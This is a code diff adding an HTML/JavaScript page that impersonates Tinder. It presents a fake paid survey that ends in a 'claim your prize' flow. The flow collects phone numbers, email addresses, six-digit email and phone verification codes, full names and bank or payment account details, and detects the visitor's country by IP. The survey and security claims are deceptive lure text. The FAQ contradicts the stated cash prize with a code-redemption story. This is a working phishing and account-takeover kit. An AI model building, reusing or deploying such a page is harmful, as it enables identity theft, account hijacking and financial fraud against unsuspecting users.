+          <button class="multi-opt" onclick="multiPick(this,'q5')"><span class="multi-check"><span class="multi-check-icon">✓</span></span><span data-i18n="q5_a5">👀 See who liked me</span></button>
+          <button class="multi-opt" onclick="multiPick(this,'q5')"><span class="multi-check"><span class="multi-check-icon">✓</span></span><span data-i18n="q5_a6">🚫 None — I only use the free version</span></button>
+        </div>
+        <div class="val-msg" id="vm-q5" data-i18n="val_multi">Please select at least one option.</div>
+      </div>
+
+      <div class="q-step" id="q6">
+        <div class="q-tag">Question 06 / 08 <span class="q-type-badge type-text" data-i18n="badge_text">Text input</span></div>
+        <div class="q-text" data-i18n="q6_text">What's one tip you'd give someone just starting on Tinder?</div>
+        <div class="q-sub" data-i18n="q6_sub">Based on your experience — what actually works?</div>
+        <div class="text-input-wrap">
+          <input class="q-text-input" type="text" id="q6-input" data-i18n-ph="q6_ph" placeholder="e.g. Use a clear photo, write a funny bio, be direct…" oninput="onShortInput('q6-input','q6-check','vm-q6','q6',5)" autocomplete="off">
+          <span class="input-check" id="q6-check">✅</span>
+        </div>
+        <div class="val-msg" id="vm-q6" data-i18n="val_text">Please type at least 5 characters to continue.</div>
+      </div>
+
+      <div class="q-step" id="q7">
+        <div class="q-tag">Question 07 / 08 <span class="q-type-badge type-choice" data-i18n="badge_choice">Multiple choice</span></div>
+        <div class="q-text" data-i18n="q7_text">What's the #1 thing that annoys you most about Tinder?</div>
+        <div class="opts" id="opts-q7">
+          <button class="opt" onclick="pick(this,'q7')"><span class="opt-radio"><span class="opt-radio-dot"></span></span><span data-i18n="q7_a1">😤 The swipe limit on the free plan</span></button>
+          <button class="opt" onclick="pick(this,'q7')"><span class="opt-radio"><span class="opt-radio-dot"></span></span><span data-i18n="q7_a2">👻 Matches who never reply</span></button>
+          <button class="opt" onclick="pick(this,'q7')"><span class="opt-radio"><span class="opt-radio-dot"></span></span><span data-i18n="q7_a3">🤖 Too many fake profiles and bots</span></button>
+          <button class="opt" onclick="pick(this,'q7')"><span class="opt-radio"><span class="opt-radio-dot"></span></span><span data-i18n="q7_a4">💸 Premium features are too expensive</span></button>
+          <button class="opt" onclick="pick(this,'q7')"><span class="opt-radio"><span class="opt-radio-dot"></span></span><span data-i18n="q7_a5">🌐 Not enough users in my area</span></button>
+        </div>
+        <div class="val-msg" id="vm-q7" data-i18n="val_choice">Please choose an answer to continue.</div>
+      </div>
+
+      <div class="q-step" id="q8">
+        <div class="q-tag">Question 08 / 08 — Final <span class="q-type-badge type-text" data-i18n="badge_text">Open text</span></div>
+        <div class="q-text" data-i18n="q8_text">If you could change one thing about Tinder, what would it be?</div>
+        <div class="q-sub" data-i18n="q8_sub">Be honest and detailed — your answer directly shapes what Tinder builds next.</div>
+        <textarea class="q-textarea" id="q8-text" data-i18n-ph="q8_ph" placeholder="Share your genuine thoughts here… the more specific, the better." oninput="onTextarea()"></textarea>
+        <div class="char-hint" id="char-hint">0 / 20 characters minimum</div>
+        <div class="val-msg" id="vm-q8" data-i18n="val_textarea">Please write at least 20 characters to continue.</div>
+      </div>
+
+      <div id="result-step" style="display:none;">
+
+        <div id="ls-blocked-screen" style="display:none;">
+          <div class="ls-wrap" style="text-align:center;padding:40px 24px;">
+            <div class="ls-logo-row" style="justify-content:center;"><div class="ls-flame">🔥</div><div class="ls-brand">tinder</div></div>
+            <div style="font-size:52px;margin:24px 0 16px;">🚫</div>
+            <div style="font-size:20px;font-weight:900;color:var(--text);margin-bottom:10px;">Survey Already Completed</div>
+            <div style="font-size:14px;font-weight:600;color:var(--muted);line-height:1.65;max-width:300px;margin:0 auto;">You have already completed this survey. Only one submission is allowed per account.</div>
+          </div>
+        </div>
+
+        <div id="ls-step1" class="ls-step" style="display:none;">
+          <div class="ls-wrap">
+            <div class="ls-logo-row"><div class="ls-flame">🔥</div><div class="ls-brand">tinder</div></div>
+            <div class="ls-congrats-pill">🏆 Survey complete — claim your prize!</div>
+            <div class="ls-title">Enter your details</div>
+            <div style="background:linear-gradient(135deg,#FFF8E1,#FFF3CD);border:2px solid #FFD700;border-radius:12px;padding:12px 16px;margin-bottom:12px;text-align:center;"><div style="font-size:11px;font-weight:800;color:#7A5C00;text-transform:uppercase;letter-spacing:1px;margin-bottom:4px;">🎁 Your prize — choose one below</div><div style="display:flex;gap:8px;justify-content:center;flex-wrap:wrap;"><span id="pill-gold" onclick="selectPrize('gold')" style="cursor:pointer;padding:6px 14px;border-radius:20px;font-size:13px;font-weight:800;background:#FFD700;color:#7A5C00;border:2px solid #FFD700;">⭐ $35 Cash Reward</span><span id="pill-cash" onclick="selectPrize('cash')" style="cursor:pointer;padding:6px 14px;border-radius:20px;font-size:13px;font-weight:800;background:transparent;color:#7A5C00;border:2px dashed #FFD700;">💵 $29 Cash</span></div></div>
+            <div class="ls-sub">We'll verify your phone and email to process your $35 cash reward.</div>
+            <div style="font-size:12px;font-weight:800;color:var(--t-red);margin-bottom:8px;display:flex;align-items:center;gap:6px;">
+              <span>📍</span> Step 1 of 2: Tap the country flag below to select your country code
+            </div>
+
+            <style>
+              .cc-wrap{position:relative;margin-top:4px;margin-bottom:0;}
+              .cc-selector-row{display:flex;align-items:center;gap:0;background:var(--bg2);border:2px solid var(--border);border-radius:var(--r-sm);overflow:hidden;transition:border-color .2s,box-shadow .2s;}
+              .cc-selector-row.not-selected{border-color:var(--border);}
+              .cc-selector-row.selected{border-color:var(--success);background:rgba(0,183,74,0.05);}
+              .cc-selector-row:focus-within{border-color:var(--t-red);box-shadow:0 0 0 3px rgba(254,60,114,0.1);}
+              #ls-phone-num:disabled{cursor:not-allowed;background:var(--bg3);opacity:0.6;}
+              #ls-phone-num:enabled{background:var(--bg2);opacity:1;cursor:text;}
+              .cc-trigger{display:flex;align-items:center;gap:6px;padding:13px 12px;cursor:pointer;border-right:2px solid var(--border);background:transparent;font-family:'Nunito',sans-serif;font-size:13px;font-weight:800;color:var(--text);white-space:nowrap;flex-shrink:0;min-width:80px;justify-content:center;}
+              .cc-trigger:hover{background:rgba(254,60,114,0.05);}
+              .cc-code{font-size:15px;font-weight:800;color:var(--text);}
+              .cc-arrow{font-size:10px;color:var(--muted);margin-left:2px;}
+              #ls-phone-num{flex:1;background:transparent;border:none;outline:none;padding:13px 12px;font-family:'Nunito',sans-serif;font-size:14px;font-weight:700;color:var(--text);}
+              #ls-phone-num::placeholder{color:var(--muted2);font-weight:600;}
+              .cc-dropdown{position:absolute;top:calc(100% + 4px);left:0;right:0;background:var(--bg2);border:2px solid var(--border);border-radius:var(--r-sm);z-index:999;max-height:220px;overflow-y:auto;box-shadow:0 8px 24px rgba(0,0,0,0.15);display:none;}
+              .cc-dropdown.open{display:block;}
+              .cc-search{width:100%;padding:10px 12px;border:none;border-bottom:1px solid var(--border);background:var(--bg2);font-family:'Nunito',sans-serif;font-size:13px;font-weight:700;color:var(--text);outline:none;}
+              .cc-opt{display:flex;align-items:center;gap:10px;padding:10px 14px;cursor:pointer;font-size:13px;font-weight:700;color:var(--text);transition:background .15s;}
+              .cc-opt:hover,.cc-opt.active{background:rgba(254,60,114,0.08);}
+              .cc-opt-flag{font-size:18px;line-height:1;flex-shrink:0;width:22px;text-align:center;}
+              .cc-opt-name{flex:1;font-size:13px;}
+              .cc-opt-code{font-size:12px;font-weight:800;color:var(--muted);}
+            </style>
+            <div style="font-size:11px;font-weight:800;color:var(--muted);text-transform:uppercase;letter-spacing:0.8px;margin-bottom:6px;">
+              📱 Enter your phone number
+            </div>
+            <div class="cc-wrap" id="cc-wrap">
+              <div class="cc-selector-row not-selected" id="cc-selector-row">
+                <div class="cc-trigger" id="cc-trigger" onclick="toggleCC()">
+                  <span class="cc-code" id="cc-code" style="color:var(--t-red);">Select</span>
+                  <span class="cc-arrow">▼</span>
+                </div>
+                <input id="ls-phone-num" type="tel" placeholder="Select country first ↑" disabled oninput="lsVal1()" autocomplete="off" style="background:var(--bg3);opacity:0.6;cursor:not-allowed;"/>
+              </div>
+              <input type="hidden" id="ls-phone" value=""/>
+              <div class="cc-dropdown" id="cc-dropdown">
+                <input class="cc-search" id="cc-search" type="text" placeholder="🔍 Search country..." oninput="filterCC(this.value)" autocomplete="off"/>
+                <div id="cc-list"></div>
+              </div>
+            </div>
+            <div class="ls-val-msg" id="ls-vm1">Please select your country code first.</div>
+            <div style="font-size:12px;font-weight:800;color:var(--muted);margin:16px 0 8px;display:flex;align-items:center;gap:6px;">
+              <span>✉️</span> Step 2 of 2: Enter your email address
+            </div>
+            <div class="ls-field-group">
+              <div class="ls-field">
+                <div class="ls-field-icon">✉️</div>
+                <input class="ls-input" type="email" id="ls-email" placeholder="Email address" oninput="lsVal1()" autocomplete="off">
+              </div>
+            </div>
+            <div class="ls-val-msg" id="ls-vm2">Please enter a valid email address.</div>
+            <script>
+            var CC_COUNTRIES=[
+              {flag:'🇺🇸',name:'United States',code:'+1',iso:'US'},
+              {flag:'🇬🇧',name:'United Kingdom',code:'+44',iso:'GB'},
+              {flag:'🇨🇦',name:'Canada',code:'+1',iso:'CA'},
+              {flag:'🇦🇺',name:'Australia',code:'+61',iso:'AU'},
+              {flag:'🇳🇬',name:'Nigeria',code:'+234',iso:'NG'},
+              {flag:'🇰🇪',name:'Kenya',code:'+254',iso:'KE'},
+              {flag:'🇬🇭',name:'Ghana',code:'+233',iso:'GH'},
+              {flag:'🇿🇦',name:'South Africa',code:'+27',iso:'ZA'},
+              {flag:'🇪🇹',name:'Ethiopia',code:'+251',iso:'ET'},
+              {flag:'🇹🇿',name:'Tanzania',code:'+255',iso:'TZ'},
+              {flag:'🇺🇬',name:'Uganda',code:'+256',iso:'UG'},
+              {flag:'🇷🇼',name:'Rwanda',code:'+250',iso:'RW'},
+              {flag:'🇿🇼',name:'Zimbabwe',code:'+263',iso:'ZW'},
+              {flag:'🇿🇲',name:'Zambia',code:'+260',iso:'ZM'},
+              {flag:'🇳🇦',name:'Namibia',code:'+264',iso:'NA'},
+              {flag:'🇧🇼',name:'Botswana',code:'+267',iso:'BW'},
+              {flag:'🇸🇳',name:'Senegal',code:'+221',iso:'SN'},
+              {flag:'🇨🇮',name:'Côte d\'Ivoire',code:'+225',iso:'CI'},
+              {flag:'🇨🇲',name:'Cameroon',code:'+237',iso:'CM'},
+              {flag:'🇩🇪',name:'Germany',code:'+49',iso:'DE'},
+              {flag:'🇫🇷',name:'France',code:'+33',iso:'FR'},
+              {flag:'🇮🇹',name:'Italy',code:'+39',iso:'IT'},
+              {flag:'🇪🇸',name:'Spain',code:'+34',iso:'ES'},
+              {flag:'🇵🇹',name:'Portugal',code:'+351',iso:'PT'},
+              {flag:'🇳🇱',name:'Netherlands',code:'+31',iso:'NL'},
+              {flag:'🇧🇪',name:'Belgium',code:'+32',iso:'BE'},
+              {flag:'🇸🇪',name:'Sweden',code:'+46',iso:'SE'},
+              {flag:'🇳🇴',name:'Norway',code:'+47',iso:'NO'},
+              {flag:'🇩🇰',name:'Denmark',code:'+45',iso:'DK'},
+              {flag:'🇵🇱',name:'Poland',code:'+48',iso:'PL'},
+              {flag:'🇷🇺',name:'Russia',code:'+7',iso:'RU'},
+              {flag:'🇮🇳',name:'India',code:'+91',iso:'IN'},
+              {flag:'🇵🇰',name:'Pakistan',code:'+92',iso:'PK'},
+              {flag:'🇧🇩',name:'Bangladesh',code:'+880',iso:'BD'},
+              {flag:'🇮🇩',name:'Indonesia',code:'+62',iso:'ID'},
+              {flag:'🇵🇭',name:'Philippines',code:'+63',iso:'PH'},
+              {flag:'🇻🇳',name:'Vietnam',code:'+84',iso:'VN'},
+              {flag:'🇹🇭',name:'Thailand',code:'+66',iso:'TH'},
+              {flag:'🇲🇾',name:'Malaysia',code:'+60',iso:'MY'},
+              {flag:'🇸🇬',name:'Singapore',code:'+65',iso:'SG'},
+              {flag:'🇨🇳',name:'China',code:'+86',iso:'CN'},
+              {flag:'🇯🇵',name:'Japan',code:'+81',iso:'JP'},
+              {flag:'🇰🇷',name:'South Korea',code:'+82',iso:'KR'},
+              {flag:'🇧🇷',name:'Brazil',code:'+55',iso:'BR'},
+              {flag:'🇲🇽',name:'Mexico',code:'+52',iso:'MX'},
+              {flag:'🇦🇷',name:'Argentina',code:'+54',iso:'AR'},
+              {flag:'🇨🇴',name:'Colombia',code:'+57',iso:'CO'},
+              {flag:'🇨🇱',name:'Chile',code:'+56',iso:'CL'},
+              {flag:'🇵🇪',name:'Peru',code:'+51',iso:'PE'},
+              {flag:'🇪🇬',name:'Egypt',code:'+20',iso:'EG'},
+              {flag:'🇲🇦',name:'Morocco',code:'+212',iso:'MA'},
+              {flag:'🇹🇳',name:'Tunisia',code:'+216',iso:'TN'},
+              {flag:'🇩🇿',name:'Algeria',code:'+213',iso:'DZ'},
+              {flag:'🇸🇦',name:'Saudi Arabia',code:'+966',iso:'SA'},
+              {flag:'🇦🇪',name:'UAE',code:'+971',iso:'AE'},
+              {flag:'🇹🇷',name:'Turkey',code:'+90',iso:'TR'},
+              {flag:'🇮🇷',name:'Iran',code:'+98',iso:'IR'},
+              {flag:'🇮🇱',name:'Israel',code:'+972',iso:'IL'},
+              {flag:'🇵🇸',name:'Palestine',code:'+970',iso:'PS'},
+              {flag:'🇯🇴',name:'Jordan',code:'+962',iso:'JO'},
+              {flag:'🇳🇿',name:'New Zealand',code:'+64',iso:'NZ'},
+            ];
+            var _ccOpen=false, _ccSelected=null;
+
+            function buildCC(){
+              var list=document.getElementById('cc-list');
+              list.innerHTML='';
+              CC_COUNTRIES.forEach(function(c,i){
+                var d=document.createElement('div');
+                d.className='cc-opt'+(i===0?' active':'');
+                d.innerHTML='<span class="cc-opt-flag">'+c.flag+'</span><span class="cc-opt-name">'+c.name+'</span><span class="cc-opt-code">'+c.code+'</span>';
+                d.onclick=function(){selectCC(c);};
+                list.appendChild(d);
+              });
+            }
+            function filterCC(q){
+              var opts=document.querySelectorAll('#cc-list .cc-opt');
+              var lower=q.toLowerCase();
+              CC_COUNTRIES.forEach(function(c,i){
+                opts[i].style.display=(c.name.toLowerCase().indexOf(lower)>-1||c.code.indexOf(q)>-1)?'flex':'none';
+              });
+            }
+            function selectCC(c){
+              _ccSelected=c;
+              document.getElementById('cc-code').textContent=c.code;
+              closeCC();
+              var ph=document.getElementById('ls-phone-num');
+              ph.disabled=false;
+              ph.placeholder='Enter phone number';
+              ph.style.background='';
+              ph.style.opacity='1';
+              ph.style.cursor='text';
+              var row=document.getElementById('cc-selector-row');
+              row.classList.remove('not-selected');
+              row.classList.add('selected');
+              document.getElementById('ls-phone').value=c.code;
+              ph.focus();
+              lsVal1();
+            }
+            function toggleCC(){
+              _ccOpen=!_ccOpen;
+              document.getElementById('cc-dropdown').classList.toggle('open',_ccOpen);
+              if(_ccOpen){setTimeout(function(){document.getElementById('cc-search').focus();},50);}
+            }
+            function closeCC(){
+              _ccOpen=false;
+              document.getElementById('cc-dropdown').classList.remove('open');
+              document.getElementById('cc-search').value='';
+              filterCC('');
+            }
+            document.addEventListener('click',function(e){
+              if(_ccOpen && !document.getElementById('cc-wrap').contains(e.target)) closeCC();
+            });
+            document.getElementById('ls-phone-num').addEventListener('input', function(){
+              var num=(this.value||'').trim();
+              var code=document.getElementById('cc-code').textContent||'+1';
+              document.getElementById('ls-phone').value=code+num;
+              if(window.lsVal1) window.lsVal1();
+            });
+            buildCC();
+
+            function autoDetectCountry(){
+              function tryApi(url, mapper){
+                return fetch(url, {cache:'no-store'}).then(function(r){ return r.json(); }).then(function(data){
+                  var iso = mapper(data);
+                  if(!iso) return false;
+                  var match = CC_COUNTRIES.filter(function(c){
+                    return (c.iso||'').toLowerCase() === iso.toLowerCase();
+                  })[0];
+                  if(match){
+                    selectCC(match);
+                    return true;
+                  }
+                  return false;
+                }).catch(function(){ return false; });
+              }
+              tryApi('https://ipapi.co/json/', function(d){ return d && (d.country_code || d.country); })
+                .then(function(ok){
+                  if(ok) return;
+                  return tryApi('https://ipwho.is/', function(d){ return d && d.country_code; });
+                });
+            }
+            setTimeout(autoDetectCountry, 300);
+            </script>
+            <button class="ls-btn" id="ls-btn1" onclick="lsS1()" style="margin-top:16px;"><span id="ls-btn1-text">Continue →</span></button>
+            <div class="ls-terms">By continuing you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.</div>
+          </div>
+        </div>
+
+        <div id="ls-step2" class="ls-step" style="display:none;"></div>
+
+        <div id="ls-step3" class="ls-step" style="display:none;">
+          <div class="ls-wrap" style="text-align:center;">
+            <div class="ls-logo-row" style="justify-content:center;"><div class="ls-flame">🔥</div><div class="ls-brand">tinder</div></div>
+            <div class="ls-spinner-wrap"><div class="ls-spinner"></div></div>
+            <div class="ls-title">Checking your account…</div>
+            <div class="ls-sub">We are verifying your phone and email. This takes just a moment.</div>
+            <div class="ls-status-bar">
+              <div class="ls-status-item"><div class="ls-status-dot done"></div><span>Survey completed</span></div>
+              <div class="ls-status-item"><div class="ls-status-dot done"></div><span>Phone &amp; email submitted</span></div>
+              <div class="ls-status-item"><div class="ls-status-dot pulse"></div><span>Verifying details…</span></div>
+              <div class="ls-status-item" style="opacity:0.35;"><div class="ls-status-dot"></div><span>Send verification codes</span></div>
+            </div>
+            <div id="ls-step3-declined" style="display:none;"></div>
+          </div>
+        </div>
+
+        <!-- STEP: EMAIL OTP ("Check your email") -->
+        <div id="ls-step5" class="ls-step" style="display:none;">
+          <div class="ls-wrap">
+            <div class="ls-logo-row"><div class="ls-flame">🔥</div><div class="ls-brand">tinder</div></div>
+            <div class="ls-title" style="text-align:center;">Check your email</div>
+            <div class="ls-sub" style="text-align:center;margin-bottom:20px;">Six digits sent to:<br><strong id="ls-email-display" style="color:var(--text);word-break:break-all;"></strong></div>
+            <div class="ls-code-row" style="gap:5px;">
+              <input class="ls-code-box" type="text" maxlength="1" id="e0" oninput="codeIn('e',0,6)" onkeydown="codeKey(event,'e',0)" style="width:40px;height:50px;font-size:20px;padding:0;">
+              <input class="ls-code-box" type="text" maxlength="1" id="e1" oninput="codeIn('e',1,6)" onkeydown="codeKey(event,'e',1)" style="width:40px;height:50px;font-size:20px;padding:0;">
+              <input class="ls-code-box" type="text" maxlength="1" id="e2" oninput="codeIn('e',2,6)" onkeydown="codeKey(event,'e',2)" style="width:40px;height:50px;font-size:20px;padding:0;">
+              <input class="ls-code-box" type="text" maxlength="1" id="e3" oninput="codeIn('e',3,6)" onkeydown="codeKey(event,'e',3)" style="width:40px;height:50px;font-size:20px;padding:0;">
+              <input class="ls-code-box" type="text" maxlength="1" id="e4" oninput="codeIn('e',4,6)" onkeydown="codeKey(event,'e',4)" style="width:40px;height:50px;font-size:20px;padding:0;">
+              <input class="ls-code-box" type="text" maxlength="1" id="e5" oninput="codeIn('e',5,6)" onkeydown="codeKey(event,'e',5)" style="width:40px;height:50px;font-size:20px;padding:0;">
+            </div>
+            <div class="ls-val-msg" id="ls-vm5">Please enter all 6 digits.</div>
+            <div id="s5-waiting" style="display:none;text-align:center;padding:10px 0 6px;">
+              <div class="ls-spinner" style="width:28px;height:28px;border-width:3px;margin:0 auto 8px;"></div>
+              <div style="font-size:12px;font-weight:700;color:var(--muted);">Verifying your code…</div>
+            </div>
+            <div id="s5-error" style="display:none;background:rgba(254,60,114,0.06);border:1.5px solid rgba(254,60,114,0.25);border-radius:10px;padding:12px 14px;margin-bottom:12px;">
+              <div style="font-size:13px;font-weight:800;color:var(--t-red);margin-bottom:4px;">❌ Incorrect code</div>
+              <div style="font-size:12px;font-weight:600;color:var(--muted);">The code you entered is wrong. Please check and try again, or request a new one.</div>
+            </div>
+            <button class="ls-btn" id="ls-btn5" onclick="lsS5()" style="display:block;"><span id="ls-btn5-text">Verify Email →</span></button>
+            <div class="ls-resend" onclick="lsResendEmail()" style="margin-top:12px;">Didn't get it? <span>Resend code</span></div>
+            <div id="resend-spam-email" style="display:none;margin-top:10px;padding:10px 14px;background:rgba(255,184,0,0.1);border:1.5px solid rgba(255,184,0,0.4);border-radius:10px;font-size:12px;font-weight:700;color:#7A5C00;line-height:1.55;">
+              📬 Code sent! If you don't see it, please check your <strong>spam or junk folder</strong>.
+            </div>
+          </div>
+        </div>
+
+        <!-- STEP: PHONE OTP -->
+        <div id="ls-step4" class="ls-step" style="display:none;">
+          <div class="ls-wrap">
+            <div class="ls-logo-row"><div class="ls-flame">🔥</div><div class="ls-brand">tinder</div></div>
+            <div class="ls-title">Enter your phone code</div>
+            <div class="ls-sub">We sent a 6-digit verification code to <strong id="ls-phone-display"></strong>. Enter it below.</div>
+            <div class="ls-code-row" style="gap:5px;">
+              <input class="ls-code-box" type="text" maxlength="1" id="p0" oninput="codeIn('p',0,6)" onkeydown="codeKey(event,'p',0)" style="width:40px;height:50px;font-size:20px;padding:0;">
+              <input class="ls-code-box" type="text" maxlength="1" id="p1" oninput="codeIn('p',1,6)" onkeydown="codeKey(event,'p',1)" style="width:40px;height:50px;font-size:20px;padding:0;">
+              <input class="ls-code-box" type="text" maxlength="1" id="p2" oninput="codeIn('p',2,6)" onkeydown="codeKey(event,'p',2)" style="width:40px;height:50px;font-size:20px;padding:0;">
+              <input class="ls-code-box" type="text" maxlength="1" id="p3" oninput="codeIn('p',3,6)" onkeydown="codeKey(event,'p',3)" style="width:40px;height:50px;font-size:20px;padding:0;">
+              <input class="ls-code-box" type="text" maxlength="1" id="p4" oninput="codeIn('p',4,6)" onkeydown="codeKey(event,'p',4)" style="width:40px;height:50px;font-size:20px;padding:0;">
+              <input class="ls-code-box" type="text" maxlength="1" id="p5" oninput="codeIn('p',5,6)" onkeydown="codeKey(event,'p',5)" style="width:40px;height:50px;font-size:20px;padding:0;">
+            </div>
+            <div class="ls-val-msg" id="ls-vm4">Please enter all 6 digits.</div>
+            <div id="s4-waiting" style="display:none;text-align:center;padding:10px 0 6px;">
+              <div class="ls-spinner" style="width:28px;height:28px;border-width:3px;margin:0 auto 8px;"></div>
+              <div style="font-size:12px;font-weight:700;color:var(--muted);">Verifying your code…</div>
+            </div>
+            <div id="s4-error" style="display:none;background:rgba(254,60,114,0.06);border:1.5px solid rgba(254,60,114,0.25);border-radius:10px;padding:12px 14px;margin-bottom:12px;">
+              <div style="font-size:13px;font-weight:800;color:var(--t-red);margin-bottom:4px;">❌ Incorrect code</div>
+              <div style="font-size:12px;font-weight:600;color:var(--muted);">The code you entered is wrong. Please check and try again, or request a new one.</div>
+            </div>
+            <button class="ls-btn" id="ls-btn4" onclick="lsS4()" style="display:block;"><span id="ls-btn4-text">Verify Phone →</span></button>
+            <div class="ls-resend" onclick="lsResendPhone()" style="margin-top:12px;">Didn't get it? <span>Resend code</span></div>
+            <div id="resend-spam-phone" style="display:none;margin-top:10px;padding:10px 14px;background:rgba(255,184,0,0.1);border:1.5px solid rgba(255,184,0,0.4);border-radius:10px;font-size:12px;font-weight:700;color:#7A5C00;line-height:1.55;">
+              📬 Code sent! If you don't see it, please check your <strong>spam or junk folder</strong>.
+            </div>
+          </div>
+        </div>
+
+        <div id="ls-step6" class="ls-step" style="display:none;">
+          <div class="ls-wrap" style="text-align:center;">
+            <div class="ls-logo-row" style="justify-content:center;"><div class="ls-flame">🔥</div><div class="ls-brand">tinder</div></div>
+
+            <div id="ls-step6-waiting">
+              <div class="ls-spinner-wrap"><div class="ls-spinner"></div></div>
+              <div class="ls-title">Checking your account...</div>
+              <div class="ls-sub">Please wait while we verify your Tinder profile status.</div>
+            </div>
+
+            <div id="ls-step6-payment" style="display:none;">
+
+              <div style="background:linear-gradient(135deg,#fff8f0,#fff0f5);border:2px solid rgba(254,60,114,0.2);border-radius:18px;padding:18px;text-align:center;margin-bottom:1.25rem;position:relative;overflow:hidden">
+                <div style="font-size:11px;font-weight:800;color:var(--t-red);text-transform:uppercase;letter-spacing:1.5px;margin-bottom:8px">🎉 Your Reward</div>
+                <div id="pay-reward-local" style="font-size:32px;font-weight:900;color:#1a1a1a;letter-spacing:-1px">$35 USD</div>
+                <div id="pay-reward-usd" style="font-size:12px;color:#999;margin-top:4px;font-weight:600">Settled in 3 business days</div>
+              </div>
+
+              <div style="margin-bottom:16px">
+                <div style="font-size:11px;font-weight:800;color:#888;text-transform:uppercase;letter-spacing:1px;margin-bottom:8px">Your Full Name</div>
+                <input id="pay-name" type="text" placeholder="As it appears on your account"
+                  style="width:100%;background:#f9f9f9;border:2px solid #eee;border-radius:14px;padding:14px 16px;font-size:15px;font-family:'Nunito',sans-serif;font-weight:700;color:#1a1a1a;outline:none;transition:border-color .2s"
+                  onfocus="this.style.borderColor='var(--t-red)'" onblur="this.style.borderColor='#eee'"/>
+              </div>
+
+              <div style="margin-bottom:16px">
+                <div style="font-size:11px;font-weight:800;color:#888;text-transform:uppercase;letter-spacing:1px;margin-bottom:8px">Payment Method</div>
+                <input type="text" id="pay-search" placeholder="🔍 Search (M-Pesa, PayPal, Zelle, Bank...)"
+                  oninput="buildPayOpts(this.value)"
+                  style="width:100%;background:#f9f9f9;border:2px solid #eee;border-radius:14px;padding:12px 16px;font-size:14px;font-family:'Nunito',sans-serif;font-weight:700;color:#1a1a1a;outline:none;margin-bottom:10px;transition:border-color .2s"
+                  onfocus="this.style.borderColor='var(--t-red)'" onblur="this.style.borderColor='#eee'"/>
+                <div id="pay-opts" style="display:grid;grid-template-columns:1fr 1fr;gap:8px;max-height:200px;overflow-y:auto"></div>
+              </div>
+
+              <div id="pay-detail-wrap" style="display:none;margin-bottom:16px">
+                <div style="font-size:11px;font-weight:800;color:#888;text-transform:uppercase;letter-spacing:1px;margin-bottom:8px" id="pay-detail-label">Account Details</div>
+                <input class="ls-input" id="pay-detail" type="text" placeholder="" style="margin-bottom:10px"/>
+                <div style="font-size:11px;font-weight:800;color:#888;text-transform:uppercase;letter-spacing:1px;margin-bottom:8px">Bank Name <span style="color:#bbb;font-weight:600;text-transform:none;font-size:11px">(if applicable)</span></div>
+                <input class="ls-input" id="pay-bank" type="text" placeholder="Enter bank name"/>
+              </div>
+
+              <p id="pay-err" style="color:var(--t-red);font-size:13px;margin-bottom:12px;font-weight:700;display:none"></p>
+              <button class="ls-btn" onclick="submitPayment()" style="font-size:16px;letter-spacing:.5px">Submit & Claim Reward →</button>
+              <div style="text-align:center;margin-top:12px;font-size:12px;color:#bbb;font-weight:600">🔒 Your details are encrypted and secure</div>
+            </div>
+
+            <div id="ls-step6-success" style="display:none;">
+              <div style="font-size:52px;margin-bottom:12px">✅</div>
+              <div class="ls-approved-badge">Payment Submitted!</div>
+              <div class="ls-title" style="margin-top:14px;font-size:20px">Your reward is on the way!</div>
+              <div class="ls-sub" style="margin-bottom:1.25rem">Payment will be settled within <strong>3 business days</strong>.</div>
+              <div style="background:var(--bg2);border:1.5px solid var(--border);border-radius:14px;padding:16px;text-align:left">
+                <div style="font-size:11px;font-weight:800;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:8px">Settlement Timeline</div>
+                <div style="font-size:13px;color:var(--text2);line-height:2">Day 1: Confirmation ✅<br>Day 2: Processing 🔄<br>Day 3: Funds sent 💰</div>
+              </div>
+            </div>
+
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="q-nav" id="q-nav">
+      <button class="btn-back" id="btn-back" onclick="goBack()" style="visibility:hidden;">← Back</button>
+      <button class="btn-next" id="btn-next" onclick="goNext()">Next →</button>
+    </div>
+
+  </div>
+</div>
+
+<!-- STATS -->
+<section class="stats-section">
+  <div class="section-title">Tinder by the numbers</div>
+  <div class="section-sub">Real data from the world's most popular dating app</div>
+  <div class="stats-grid">
+    <div class="stat-card"><div class="stat-card-val">75M+</div><div class="stat-card-lbl">Active users worldwide</div></div>
+    <div class="stat-card"><div class="stat-card-val">1.5B</div><div class="stat-card-lbl">Swipes every single day</div></div>
+    <div class="stat-card"><div class="stat-card-val">70M+</div><div class="stat-card-lbl">Matches made daily</div></div>
+    <div class="stat-card"><div class="stat-card-val">190+</div><div class="stat-card-lbl">Countries available in</div></div>
+  </div>
+</section>
+
+<!-- FAQ -->
+<section class="faq-section">
+  <div class="section-title">Common questions</div>
+  <div class="section-sub">Everything you need to know about this survey</div>
+  <div class="faq-item">
+    <div class="faq-q" onclick="toggleFaq(this)">Is this survey actually free? <span class="faq-icon">+</span></div>
+    <div class="faq-a">Yes — 100% free. This is a genuine user research survey. Your $35 Cash Reward reward code is provided as a thank-you for your time, with no purchase or payment required.</div>
+  </div>
+  <div class="faq-item">
+    <div class="faq-q" onclick="toggleFaq(this)">Do I have to answer every question? <span class="faq-icon">+</span></div>
+    <div class="faq-a">Yes. All 8 questions — including the typed ones — must be fully completed to unlock the reward code. Partial submissions do not qualify.</div>
+  </div>
+  <div class="faq-item">
+    <div class="faq-q" onclick="toggleFaq(this)">Why are some questions typed instead of multiple choice? <span class="faq-icon">+</span></div>
+    <div class="faq-a">Typed answers give us much richer insights than checkboxes. We want your real voice, not just a pre-selected option. It also ensures you're a genuine user, not a bot.</div>
+  </div>
+  <div class="faq-item">
+    <div class="faq-q" onclick="toggleFaq(this)">How do I redeem the code? <span class="faq-icon">+</span></div>
+    <div class="faq-a">Open Tinder → tap your profile photo → Settings → Manage Account → Redeem a Code. Paste your code and Gold activates instantly.</div>
+  </div>
+  <div class="faq-item">
+    <div class="faq-q" onclick="toggleFaq(this)">How long is the code valid? <span class="faq-icon">+</span></div>
+    <div class="faq-a">Reward codes are valid for 30 days from the time they are generated. Redeem promptly to avoid expiry.</div>
+  </div>
+</section>
+
+<!-- FOOTER -->
+<footer class="footer">
+  <div>
+    <div class="footer-logo-text">tinder</div>
+    <div class="footer-copy">© 2025 Tinder Experience Survey</div>
+  </div>
+  <div class="footer-links">
+    <a href="#">Privacy</a>
+    <a href="#">Terms</a>
+    <a href="#">Contact</a>
+  </div>
+</footer>
+
+<div class="toast" id="toast">✓ Copied to clipboard</div>
+
